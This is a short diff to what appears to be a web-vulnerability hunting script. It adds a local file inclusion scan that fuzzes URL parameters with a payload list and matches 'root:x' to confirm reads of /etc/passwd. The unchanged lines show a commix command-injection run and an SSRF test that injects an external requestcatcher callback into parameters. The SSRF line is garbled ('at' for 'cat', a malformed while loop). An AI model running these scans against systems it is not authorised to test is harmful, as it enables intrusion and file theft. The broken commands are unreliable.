@@ -15,8 +15,10 @@ python3 /opt/commix/commix.py -m $url/recon/final_params.txt --batch
 #XXE Injectio : 
 
 #Local File Inclusion : 
-
+cat params.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -v -mr "root:x" -w /root/lfi-payloads.txt; done > lfi.txt
 #Parameter Pollution : 
 
 #External SSRF : 
 at $url/recon/final_params.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $url/recon/ssrftest.txt && cat $url/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host \033[0;31mVulnearble\n"; done >> $url/params_vuln/eSSRF.txt
+
+
